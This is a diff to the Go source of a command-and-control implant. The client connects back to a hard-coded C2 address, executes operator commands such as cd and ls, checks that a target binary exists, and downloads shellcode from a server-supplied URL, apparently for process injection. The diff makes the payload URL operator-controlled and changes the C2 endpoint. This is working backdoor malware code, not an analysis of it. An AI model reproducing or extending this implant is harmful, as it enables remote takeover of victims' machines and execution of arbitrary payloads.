@@ -76,6 +76,7 @@ func executeCommands(conn *net.Conn, command *string) {
 	(*conn).Write(output)
 }
 
+// Have the server send a list of processes to check instead of hard coding them in the client
 // func checkSec() []string {
 // 	products := []string{}
 // 	procs, err := process.GetProcesses()
@@ -141,7 +142,7 @@ func ls(conn *net.Conn, implantWD *string) {
 }
 
 func main() {
-	c2Address := "192.168.5.222:4444"
+	c2Address := "192.168.0.102:9001"
 	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
@@ -178,10 +179,6 @@ func main() {
 			{
 				cd(&conn, &implantWD)
 			}
-		case "butterInjection\n":
-			{
-				fmt.Println("Chicken Kiev")
-			}
 		case "ls\n":
 			{
 				ls(&conn, &implantWD)
@@ -195,7 +192,7 @@ func main() {
 			{
 				conn.Write([]byte("OK\n"))
 				//Check if the file even exists
-				buffer := make([]byte, 60838412)
+				buffer := make([]byte, 100) //It was 6MB buffer no need for smth so large
 				read_len, err := conn.Read(buffer)
 				if err != nil {
 					fmt.Println("Problem Reading the buffer")
@@ -209,7 +206,7 @@ func main() {
 				}
 				filePath := string(buffer[:read_len])
 				fmt.Println(filePath)
-				//filePath = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
+				// filePath = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
 				_, err = os.Stat(filePath)
 				if err != nil {
 					fmt.Println("The binary does not exist !!! Path: " + filePath)
@@ -219,10 +216,28 @@ func main() {
 				}
 				conn.Write([]byte("OK\n"))
 				fmt.Println("The file exists and is readable: " + filePath)
-				// Ez way
-				c2URL := strings.Split(c2Address, ":")[0]
-				c2URL = "http://" + c2URL + "8080"
-				sc, err := shellcode.GetShellcodeFromUrl(c2URL)
+
+				// Get the download URL of the remote file
+				read_len, err = conn.Read(buffer)
+				if err != nil {
+					fmt.Println("Problem Reading the buffer")
+					conn.Write([]byte("Return"))
+					return
+				}
+				if read_len <= 1 {
+					fmt.Println("Problem with Buffer Size")
+					conn.Write([]byte("Return"))
+					return
+				}
+				bufferSnapped := buffer[:read_len]
+				remoteFileURL := string(bufferSnapped)
+				fmt.Println(remoteFileURL)
+				if remoteFileURL == "" {
+					fmt.Println("URL not recieved !")
+					conn.Write([]byte("Return"))
+				}
+				conn.Write([]byte("OK\n"))
+				sc, err := shellcode.GetShellcodeFromUrl(remoteFileURL)
 				if err != nil {
 					fmt.Println("Couldn't get shellcode")
 					return
